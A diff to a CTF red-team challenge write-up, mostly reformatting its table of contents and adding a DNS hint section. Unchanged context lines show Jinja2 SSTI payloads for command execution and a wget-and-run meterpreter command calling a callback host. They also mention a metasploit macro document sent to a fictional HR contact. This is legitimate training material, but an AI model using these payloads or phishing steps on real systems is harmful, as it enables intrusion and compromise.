@@ -16,29 +16,46 @@ categories: WriteUp
    - [Phishing](#phishing)
    - [AD Compromise](#ad-compromise)
    - [Infrastucture](#infrastucture)
-4. [Write up (Solution)](#write-up--solution)
+4. [Write up (Solution)](#write-up-solution)
    - [Description](#description)
-   - [Step 1 - OSINT](#step-1-osint)
-      - [Google](#google)
-      - [Twitter](#twitter)
-      - [GitHub](#github)
-      - [Instagram](#instagram)
-      - [Google again](#google-again)
-      - [LinkedIn](#linkedin)
-      - [The Website](#the-website)
-      - [Fun Fact: Malware site](#fun-fact-malware-site)
-      - [Fun Fact: Collateral damage](#fun-fact-collateral-damage)
-   - [Step 2 - Web Application Pentest](#step-2-web-application-pentest)
-      - [Intended way: Weak ACL](#intended-way--weak-acl)
-      - [Unintended way: Cookie Flask with weak secret](#unintended-way--cookie-flask-with-weak-secret)
+   - [Step 1 - OSINT](#step-1---osint)
+      <table style="margin: 0; width: 100%; border: none;">
+         <tr style="border: none; padding: 0">
+            <td style="border: none; padding: 0; width: 33.333%; vertical-align: top;">
+               <ul>
+               <li><a href="#google">Google</a></li>
+               <li><a href="#twitter">Twitter</a></li>
+               <li><a href="#github">GitHub</a></li>
+               <li><a href="#instagram">Instagram</a></li>
+               </ul>
+            </td>
+            <td style="border: none; padding: 0; width: 33.333%; vertical-align: top;">
+               <ul>
+               <li><a href="#google-again">Google again</a></li>
+               <li><a href="#linkedin">LinkedIn</a></li>
+               <li><a href="#the-website">The Website</a></li>
+               <li><a href="#fun-fact-malware-site">Fun Fact: Malware site</a></li>
+               </ul>
+            </td>
+            <td style="border: none; padding: 0; width: 33.333%; vertical-align: top;">
+               <ul>
+               <li><a href="#fun-fact-collateral-damage">Fun Fact: Collateral damage</a></li>
+               <li><a href="#this-hint-noone-found">This Hint noone found</a></li>
+               </ul>
+            </td>
+         </tr>
+      </table>
+   - [Step 2 - Web Application Pentest](#step-2---web-application-pentest)
+      - [Intended way: Weak ACL](#intended-way-weak-acl)
+      - [Unintended way: Cookie Flask with weak secret](#unintended-way-cookie-flask-with-weak-secret)
       - [Fun Fact: Pranksters](#fun-fact-pranksters)
       - [SSTI](#ssti)
-   - [Step 3 - Phishing some HR](#step-3-phishing-some-hr)
+   - [Step 3 - Phishing some HR](#step-3---phishing-some-hr)
       - [Pivot with the Web App](#pivot-with-the-web-app)
-      - [FunFact: Database said "YAMETE KUDASAI"](#funfact-database-said-yamete-kudasai)
+      - [Fun Fact: Database under pressure](#fun-fact-database-under-presure)
       - [Phishing Click Master](#phishing-click-master)
       - [Fun Fact: Funny emails received](#fun-fact-funny-emails-received)
-   - [Step 4 - CISO here I come](#step-4-ciso-here-i-come)
+   - [Step 4 - CISO here I come](#step-4---ciso-here-i-come)
       - [Recon on HR](#recon-on-hr)
       - [Fun Fact: Where is the LPE](#fun-fact-where-is-the-lpe)
       - [Zabbix](#zabbix)
@@ -256,6 +273,12 @@ When admins got aware of this information, a Discord message was sent to tell ch
 
 ![Admin call](/assets/redteam/admincall.png)
 
+#### This Hint noone found
+
+During the tests of the challenge our tester told us the DNS entries for `phealthycat.org` pointed the mailer to our hosting provider (OVH). We then decided to configure the MX entry to point an internal IP address to give a hint where [not] to go next.
+
+![Robtex mailer.phealthycat.org](/assets/redteam/robtex.png)
+
 ### Step 2 - Web Application Pentest
 
 The application allows users to create an account. For this Write-up, we will create an account named `writeup`.   
@@ -290,9 +313,9 @@ Now that we can access the template feature, we can perform some remote code exe
 Here again there were two ways:
 * Easy way: use `TemplateReference` object to call the `os.system`;
 The payload using TemplateReference:  
-{% raw %}
+<!-- {% raw %} -->
 `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("CMD") }}`
-{% endraw %}
+<!-- {% endraw %} -->
 * Hard way: use object introspection to find `subprocess.popen` method.
 For the hard way, we enumerate the subclasses to find the `subprocess.popen` method.
 
@@ -300,9 +323,9 @@ For the hard way, we enumerate the subclasses to find the `subprocess.popen` met
 ![ssti](/assets/redteam/SSTIIntend2.png)
 
 We sort all the classes and method to find the offset of our method. It appears to be the offset `418 - 1` (array start at 0).
-{% raw %}
+<!-- {% raw %} -->
 Therefore by calling `{{ ().__class__.__bases__[0].__subclasses__()[417]("CMD") }}` we obtain the popen method to perform arbitrary command.
-{% endraw %}
+<!-- {% endraw %} -->
 Now that we have a RCE on the application, we now want a shell. For that, we'll make the application to download a meterpreter and execute it.
 
 The payload will be: `cd /tmp && wget http://<CALLBACK_IP>/meter.elf && chmod +x /tmp/meter.elf && /tmp/meter.elf`.
@@ -354,7 +377,7 @@ If we scan the second machine:
 We can find a SMTP port open. If we remember the Part1 of the challenge, it was said "Send your resume to Lucie Bayard".   
 So we need to perform some spear phishing on Lucie Bayard.
 
-#### FunFact: Database under presure
+#### Fun Fact: Database under presure
 
 For a lot of challengers, the database was **the man to kill**.
 
@@ -380,7 +403,7 @@ Then, we will create a docm using metasploit
 ![Macro](/assets/redteam/MacroMeter.png)
 
 And we will use the first script we find on a random github (https://gist.github.com/boina-n/e43b996fa0f520c918e3ed6beb754447) to sent it:
-```
+```bash
 #!/bin/bash
 
 filename="/tmp/msf.docm"
